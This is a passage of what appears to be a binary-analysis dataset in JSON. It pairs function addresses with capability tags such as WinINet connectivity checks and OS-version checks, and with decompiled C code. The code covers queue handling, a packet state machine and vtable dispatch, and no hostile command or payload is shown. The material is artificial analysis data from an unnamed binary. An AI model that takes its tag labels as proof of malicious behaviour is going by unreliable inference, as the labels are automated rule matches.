}\n        if (arg_1ch != 0xffffffff) {\n            iVar1 = fcn.00026ff0();\n            if (arg_1ch < iVar1 - var_8h) {\n                arg_1ch = 0;\n            }\n            else {\n                arg_1ch = arg_1ch - (iVar1 - var_8h);\n            }\n        }\n        fcn.00034a10(arg_8h + 0x48);\n        *(arg_8h + 0x50) = *(arg_8h + 0x50) + -1;\n    } while( true );\n}\n",
        "token_count": 1113
    },
    "00073240": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00073240(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h, unkuint3 **arg_14h, int32_t *arg_18h, uint32_t arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    bool bVar5;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    unkuint3 *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_20h = NULL;\n    var_1ch = 0;\n    while( true ) {\n        if (*(arg_8h + 0xc) != 0) {\n            var_2ch = 0x21590006;\n            goto code_r0x000739ff;\n        }\n        if (*(arg_8h + 8) == 0) break;\n        if ((*(arg_8h + 0x44) == 0) || (*(arg_8h + 0x10) != 3)) {\n            var_30h = 0;\n        }\n        else {\n            iVar2 = fcn.00026ff0();\n            var_4h = iVar2 - *(arg_8h + 0x6c);\n            uVar1 = *(arg_8h + 0x38);\n            uVar3 = fcn.00078a6e();\n            var_8h = (uVar1 >> 1) + 1 + uVar3 % *(arg_8h + 0x38);\n            var_30h = var_8h < var_4h;\n        }\n        if (var_30h != 0) {\n            var_24h._0_2_ = var_24h & 0xff00 | *(arg_8h + 0x14);\n            var_24h._2_1_ = fcn.00078a6e();\n            var_24h._0_2_ = CONCAT11(0x10, var_24h);\n            var_2ch = fcn.00072a20(arg_8h, 0, 0, &var_24h);\n            if (var_2ch != 0) goto code_r0x000739ff;\n            uVar4 = fcn.00026ff0();\n            *(arg_8h + 0x6c) = uVar4;\n        }\n        iVar2 = fcn.00026ff0();\n        var_ch = iVar2 - *(arg_8h + 0x70);\n        if (var_ch < *(arg_8h + 0x38) * *(arg_8h + 0x34)) {\n            var_34h = *(arg_8h + 0x38) * *(arg_8h + 0x34) - var_ch;\n        }\n        else {\n            var_34h = 0;\n        }\n        bVar5 = var_34h <= arg_1ch;\n        if (!bVar5) {\n            var_34h = arg_1ch;\n        }\n        var_14h = bVar5;\n        if (arg_1ch != 0xffffffff) {\n            var_1ch = fcn.00026ff0();\n        }\n        var_2ch = fcn.00076860(*(arg_8h + 4), &var_20h, &var_18h, var_34h, 0);\n        if (arg_1ch != 0xffffffff) {\n            iVar2 = fcn.00026ff0();\n            var_10h = iVar2 - var_1ch;\n            if (var_10h < arg_1ch) {\n                arg_1ch = arg_1ch - var_10h;\n            }\n            else {\n                arg_1ch = 0;\n            }\n        }\n        if (var_2ch == 0) {\n            if (var_18h < 3) {\n                if ((*(arg_8h + 0x10) == 2) || (*(arg_8h + 0x10) == 1)) {\n                    var_2ch = 0x2159000a;\n                    goto code_r0x000739ff;\n                }\n                fcn.00076a80(*(arg_8h + 4), var_20h);\n                var_20h = NULL;\n            }\n            else {\n                var_38h = var_38h & 0xff000000 | *var_20h;\n                fcn.00072270(&var_38h);\n                if ((var_38h & 0x4000) == 0) {\n                    uVar4 = fcn.00026ff0();\n                    *(arg_8h + 0x70) = uVar4;\n                    var_24h._0_1_ = var_38h;\n                    if ((((*(arg_8h + 0x10) == 2) || (*(arg_8h + 0x10) == 1)) && ((var_38h & 0x100) == 0)) &&\n                       ((var_38h & 0x2000) == 0)) {\n                        if (*(arg_8h + 0x10) != 2) {\n                            var_24h._2_1_ = var_38h._2_1_;\n                            var_24h._0_2_ = CONCAT11(0x20, var_24h);\n                            fcn.00072a20(arg_8h, 0, 0, &var_24h);\n                        }\n                        fcn.00076a80(*(arg_8h + 4), var_20h);\n                        var_20h = NULL;\n                    }\n                    else if (((*(arg_8h + 0x10) == 0) && ((var_38h & 0x200) == 0)) && ((var_38h & 0x2000) == 0)) {\n                        var_24h._2_1_ = var_38h._2_1_;\n                        var_24h._0_2_ = CONCAT11(2, var_24h);\n                        fcn.00072a20(arg_8h, 0, 0, &var_24h);\n                        fcn.00076a80(*(arg_8h + 4), var_20h);\n                        var_20h = NULL;\n                    }\n                    else {\n                        if ((((*(arg_8h + 0x10) == 1) && ((var_38h & 0x100) != 0)) && ((var_38h & 0x400) == 0)) ||\n                           ((*(arg_8h + 0x10) == 3 &&\n                            ((((var_38h & 0x1000) != 0 || ((var_38h & 0x100) != 0)) && ((var_38h & 0x400) == 0)))))) {\n                            var_24h._2_1_ = var_38h._2_1_;\n                            var_24h._0_2_ = var_38h | 0x400;\n                            var_2ch = fcn.00072a20(arg_8h, 0, 0, &var_24h);\n                            if (var_2ch != 0) goto code_r0x000739ff;\n                            if (((var_38h & 0x100) != 0) && (*(arg_8h + 0x10) == 1)) {\n                                *(arg_8h + 0x15) = var_38h + '\\x01';\n                                *(arg_8h + 0x10) = 3;\n                            }\n                        }\n                        if (((*(arg_8h + 0x10) == 3) || (*(arg_8h + 0x10) == 2)) &&\n                           (((var_38h & 0x400) != 0 &&\n                            (((var_38h & 0x1000) == 0 && ((var_38h & 0xff) == *(arg_8h + 0x14))))))) {\n                            if (((var_38h & 0x100) != 0) && (*(arg_8h + 0x10) == 2)) {\n                                *(arg_8h + 0x10) = 3;\n                            }\n                            if (arg_ch == 1) {\n                                *arg_10h = var_38h._2_1_;\n                                var_2ch = 0;\n                                goto code_r0x000739ff;\n                            }\n                            fcn.00034a10(arg_8h + 0x48);\n                            *(arg_8h + 0x58) = var_38h._2_1_;\n                            *(arg_8h + 0x5c) = 1;\n                            fcn.00034570(arg_8h + 0x54);\n                            fcn.00034a80(arg_8h + 0x48);\n                        }\n                        if (((var_38h & 0x2000) != 0) &&\n                           (((var_38h & 0xff) == *(arg_8h + 0x14) || ((var_38h & 0xff) == *(arg_8h + 0x15))))) {\n                            *(arg_8h + 0x10) = 0;\n                            var_2ch = 0x21590003;\n                            goto code_r0x000739ff;\n                        }\n                        if ((*(arg_8h + 0x10) == 3) && ((var_38h & 0x800) != 0)) {\n                            var_24h._0_1_ = var_38h;\n                            if ((var_38h & 0xff) == *(arg_8h + 0x15)) {\n                                if (arg_ch == 2) {\n                                    var_24h._2_1_ = var_38h._2_1_;\n                                    var_24h._0_2_ = CONCAT11(4, var_24h);\n                                    var_2ch = fcn.00072a20(arg_8h, 0, 0, &var_24h);\n                                    if (var_2ch == 0) {\n                                        *(arg_8h + 0x15) = *(arg_8h + 0x15) + '\\x01';\n                                        *arg_14h = var_20h + 1;\n                                        *arg_18h = var_18h - 3;\n                                        var_20h = NULL;\n                                        var_2ch = 0;\n                                    }\n                                    goto code_r0x000739ff;\n                                }\n                                var_38h = arg_8h + 0x48;\n                                fcn.00034a10(var_38h);\n                                if (*(arg_8h + 0xc) != 0) {\n                                    var_2ch = 0x21590006;\n                                    fcn.00034a80(arg_8h + 0x48);\n                                    goto code_r0x000739ff;\n                                }\n                                if (*(arg_8h + 8) == 0) {\n                                    var_2ch = 0x21590003;\n                                    fcn.00034a80(arg_8h + 0x48);\n                                    goto code_r0x000739ff;\n                                }\n                                if ((*(arg_8h + 0x68) + var_18h < 0x100000) &&\n                                   (var_28h = fcn.000356c0(0x10),  var_28h != NULL)) {\n                                    var_24h._2_1_ = var_38h._2_1_;\n                                    var_24h._0_1_ = var_38h;\n                                    var_24h._0_2_ = CONCAT11(4, var_24h);\n                                    var_2ch = fcn.00072a20(arg_8h, 0, 0, &var_24h);\n                                    if (var_2ch != 0) {\n                                        fcn.00034a80(arg_8h + 0x48);\n                                        goto code_r0x000739ff;\n                                    }\n                                    *var_28h = 0;\n                                    var_28h[1] = 0;\n                                    var_28h[2] = 0;\n                                    var_28h[3] = 0;\n                                    var_28h[1] = var_20h;\n                                    var_28h[2] = var_18h;\n                                    var_20h = NULL;\n                                    if (*(arg_8h + 100) == 0) {\n                                        *(arg_8h + 0x60) = var_28h;\n                                    }\n                                    else {\n                                        **(arg_8h + 100) = var_28h;\n                                    }\n                                    *(arg_8h + 100) = var_28h;\n                                    *(arg_8h + 0x68) = *(arg_8h + 0x68) + var_18h;\n                                    var_38h = arg_8h + 0x54;\n                                    fcn.00034570(var_38h);\n                                    *(arg_8h + 0x15) = *(arg_8h + 0x15) + '\\x01';\n                                }\n                                fcn.00034a80(arg_8h + 0x48);\n                            }\n                            else {\n                                if (*(arg_8h + 0x15) - (var_38h & 0xff) < 0x7f) {\n                                    var_24h._2_1_ = var_38h._2_1_;\n                                    var_24h._0_2_ = CONCAT11(4, var_24h);\n                                    var_2ch = fcn.00072a20(arg_8h, 0, 0, &var_24h);\n                                }\n                                else {\n                                    var_24h._2_1_ = var_38h._2_1_;\n                                    var_24h._0_2_ = CONCAT11(0x20, var_24h);\n                                    var_2ch = fcn.00072a20(arg_8h, 0, 0, &var_24h);\n                                }\n                                if (var_2ch != 0) goto code_r0x000739ff;\n                            }\n                        }\n                        if (((var_38h & 0x200) != 0) && ((var_38h & 0xff) == *(arg_8h + 0x15))) {\n                            var_24h._2_1_ = var_38h._2_1_;\n                            var_24h._0_1_ = var_38h;\n                            var_24h._0_2_ = CONCAT11(4, var_24h);\n                            var_2ch = fcn.00072a20(arg_8h, 0, 0, &var_24h);\n                            if (var_2ch != 0) goto code_r0x000739ff;\n                            *(arg_8h + 0x10) = 0;\n                            *(arg_8h + 8) = 0;\n                            fcn.00034570(arg_8h + 0x54);\n                        }\n                        fcn.00076a80(*(arg_8h + 4), var_20h);\n                        var_20h = NULL;\n                    }\n                }\n                else {\n                    if ((*(arg_8h + 0x10) == 2) || (*(arg_8h + 0x10) == 1)) {\n                        var_2ch = 0x2159000a;\n                        goto code_r0x000739ff;\n                    }\n                    fcn.00076a80(*(arg_8h + 4), var_20h);\n                    var_20h = NULL;\n                }\n            }\n        }\n        else {\n            if (var_2ch != 0x21590002) goto code_r0x000739ff;\n            iVar2 = fcn.00026ff0();\n            var_ch = iVar2 - *(arg_8h + 0x70);\n            if (*(arg_8h + 0x38) * *(arg_8h + 0x34) <= var_ch) {\n                *(arg_8h + 8) = 0;\n                goto code_r0x000739ff;\n            }\n            if ((var_14h == 0) || (arg_1ch == 0)) goto code_r0x000739ff;\n        }\n    }\n    var_2ch = 0x21590003;\ncode_r0x000739ff:\n    fcn.00076a80(*(arg_8h + 4), var_20h);\n    return var_2ch;\n}\n",
        "token_count": 3856
    },
    "00073a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00073a60(uint *arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    (**0x8005100c)();\n    var_ch = *arg_8h;\n    while (var_ch != NULL) {\n        puVar1 = *var_ch;\n        if (arg_ch != '\\0') {\n            fcn.000357f0(var_ch[1]);\n        }\n        fcn.000357f0(var_ch);\n        var_ch = puVar1;\n    }\n    (**0x80051010)();\n    fcn.00034540(arg_8h + 3);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 235
    },
    "00073af0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00073af0(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    uint var_1h;\n    \n    if (((arg_8h == 0) || (arg_10h == NULL)) || (arg_14h == NULL)) {\n        uVar1 = 0x21590064;\n    }\n    else {\n        puVar2 = fcn.000356f0(0x1c);\n        if (puVar2 == NULL) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            puVar2[1] = arg_8h;\n            puVar2[2] = arg_ch;\n            *puVar2 = 0;\n            puVar2[3] = *arg_14h;\n            puVar2[4] = arg_14h[1];\n            puVar2[5] = arg_14h[2];\n            puVar2[6] = arg_14h[3];\n            (**0x8005100c)();\n            if (*arg_10h == 0) {\n                arg_10h[1] = puVar2;\n                *arg_10h = puVar2;\n            }\n            else {\n                *arg_10h[1] = puVar2;\n                arg_10h[1] = puVar2;\n            }\n            arg_10h[2] = arg_10h[2] + arg_ch;\n            (**0x80051010)();\n            fcn.00034570(arg_10h + 3);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 411
    },
    "00073be0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00073be0(uint *arg_8h, uint *arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t *arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (((arg_10h == NULL) || (arg_ch == NULL)) || (arg_14h == NULL)) {\n        var_8h = 0x21590064;\n    }\n    else {\n        (**0x8005100c)();\n        if (*arg_10h == 0) {\n            var_8h = 0xffffffff;\n        }\n        else {\n            arg_8h_00 = *arg_10h;\n            *arg_8h = arg_8h_00[1];\n            *arg_ch = arg_8h_00[2];\n            *arg_14h = arg_8h_00[3];\n            arg_14h[1] = arg_8h_00[4];\n            arg_14h[2] = arg_8h_00[5];\n            arg_14h[3] = arg_8h_00[6];\n            *arg_10h = *arg_8h_00;\n            if (*arg_10h == 0) {\n                arg_10h[1] = 0;\n            }\n            arg_10h[2] = arg_10h[2] - arg_8h_00[2];\n            fcn.000357f0(arg_8h_00);\n            var_8h = 0;\n        }\n        (**0x80051010)();\n    }\n    return var_8h;\n}\n",
        "token_count": 394
    },
    "00073ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00073ce0(int32_t **arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *arg_8h = NULL;\n    var_8h = 0;\n    while( true ) {\n        if (*(arg_ch + var_8h * 4) == 0) {\n            return 0x21590005;\n        }\n        arg_8h_00 = fcn.00035820(*(arg_ch + var_8h * 4));\n        if (arg_8h_00 == NULL) {\n            return 0x21590004;\n        }\n        var_18h = fcn.00078a44(arg_8h_00, 0x2e);\n        if (var_18h != NULL) {\n            *var_18h = 0;\n            var_18h = var_18h + 1;\n        }\n        pcVar3 = arg_8h_00;\n        uVar4 = arg_20h;\n        var_14h = fcn.00075c90(arg_8h_00);\n        if (var_14h == 0) {\n            fcn.000357f0(arg_8h_00);\n            var_10h = 0x21590005;\n            if ((*0x800da9cc != 0) &&\n               (var_10h = (**(*0x800da9cc + 0xc))\n                                    (arg_8h, *(arg_ch + var_8h * 4), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, pcVar3\n                                     , uVar4),  var_10h == 0)) {\n                var_14h = *0x800da9cc;\n            }\n            if ((var_14h == 0) && (var_10h != 0x21590005)) {\n                return var_10h;\n            }\n        }\n        else {\n            if (var_18h == NULL) {\n                var_20h = arg_8h_00;\n                do {\n                    cVar1 = *var_20h;\n                    var_20h = var_20h + 1;\n                } while (cVar1 != '\\0');\n                var_ch = var_20h - (arg_8h_00 + 1);\n            }\n            else {\n                var_ch = var_18h - arg_8h_00;\n            }\n            fcn.000357f0(arg_8h_00);\n            var_10h = (**(var_14h + 0xc))(arg_8h, *(arg_ch + var_8h * 4) + var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, \n                                          arg_20h & 0xfffeffff);\n        }\n        if (var_14h != 0) break;\n        var_8h = var_8h + 1;\n    }\n    if (var_10h != 0) {\n        return var_10h;\n    }\n    if (*arg_8h != NULL) {\n        arg_8h_01 = fcn.000356c0(0x18);\n        if (arg_8h_01 == NULL) {\n            (**(var_14h + 0x10))(*arg_8h, 0);\n            (**(var_14h + 0x14))(*arg_8h, 0);\n            *arg_8h = NULL;\n            return 0x21590004;\n        }\n        *arg_8h_01 = var_14h;\n        arg_8h_01[5] = 0;\n        fcn.00036ed0(arg_8h_01 + 1);\n        **arg_8h = arg_8h_01;\n        iVar2 = fcn.0006d170(*arg_8h, 1);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        fcn.00036f40(arg_8h_01 + 1);\n        fcn.000357f0(arg_8h_01);\n        (**(var_14h + 0x10))(*arg_8h, 0);\n        (**(var_14h + 0x14))(*arg_8h, 0);\n        *arg_8h = NULL;\n        return 0x21590004;\n    }\n    (**(var_14h + 0x10))(*arg_8h, 0);\n    (**(var_14h + 0x14))(*arg_8h, 0);\n    return -1;\n}\n",
        "token_count": 1189
    },
    "00073fa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00073fa0(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    fcn.00034a10(0x800cdc18);\n    iVar1 = fcn.0006d2c0(arg_8h_00, 1);\n    if (iVar1 == 0) {\n        fcn.00034a80(0x800cdc18);\n        *arg_8h = NULL;\n    }\n    else {\n        arg_8h_01 = *arg_8h_00;\n        if (arg_8h_01[5] == 0) {\n            arg_8h_01[5] = 1;\n            fcn.00034a80(0x800cdc18);\n            (**(**arg_8h_00 + 0x10))(arg_8h_00, arg_ch);\n            fcn.00037100(arg_8h_01 + 1);\n            fcn.00034a10(0x800cdc18);\n            *arg_8h = NULL;\n            fcn.0006d200(arg_8h_00, 1);\n            fcn.00034a80(0x800cdc18);\n            (**(**arg_8h_00 + 0x14))(arg_8h_00, arg_ch);\n            fcn.00037190(arg_8h_01 + 1);\n            fcn.00036f40(arg_8h_01 + 1);\n            fcn.000357f0(arg_8h_01);\n        }\n        else {\n            fcn.00034a80(0x800cdc18);\n            *arg_8h = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "000740b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.000740b0(int32_t **arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x1c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x1c) != 0)) {\n            var_4h = (**(**arg_8h + 0x1c))(arg_8h, arg_ch, arg_10h);\n            if (var_4h == 0) {\n                arg_8h_00 = fcn.000356c0(0x18);\n                if (arg_8h_00 == NULL) {\n                    fcn.00037020(*arg_8h + 1);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    return 0x21590004;\n                }\n                *arg_8h_00 = **arg_8h;\n                arg_8h_00[5] = 0;\n                fcn.00036ed0(arg_8h_00 + 1);\n                **arg_ch = arg_8h_00;\n                iVar1 = fcn.0006d170(*arg_ch, 1);\n                if (iVar1 == 0) {\n                    fcn.00036f40(arg_8h_00 + 1);\n                    fcn.000357f0(arg_8h_00);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    var_4h = 0x21590004;\n                }\n            }\n            else if ((*arg_8h)[5] != 0) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 556
    },
    "00074230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074230(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        var_4h = fcn.00076ff0(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        var_4h = fcn.000749b0(arg_8h);\n        if (var_4h == 0) {\n            if (((**arg_8h + 0x30) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x30) != 0)) {\n                var_4h = (**(**arg_8h + 0x30))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n                if (var_4h == 0) {\n                    var_4h = fcn.00076ff0(arg_ch, arg_10h, arg_14h, arg_18h);\n                }\n                fcn.00037020(*arg_8h + 1);\n            }\n            else {\n                fcn.00037020(*arg_8h + 1);\n                var_4h = 0x21590001;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 349
    },
    "00074310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074310(int32_t **arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x18) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x18) != 0)) {\n            var_4h = (**(**arg_8h + 0x18))(arg_8h, arg_ch);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 262
    },
    "000743d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000743d0(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x20) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x20) != 0)) {\n            var_4h = (**(**arg_8h + 0x20))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 274
    },
    "00074490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074490(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x24) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x24) != 0)) {\n            var_4h = (**(**arg_8h + 0x24))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 273
    },
    "00074550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074550(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x28) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x28) != 0)) {\n            var_4h = (**(**arg_8h + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 284
    },
    "00074610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074610(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x2c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x2c) != 0)) {\n            var_4h = (**(**arg_8h + 0x2c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 298
    },
    "000746e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
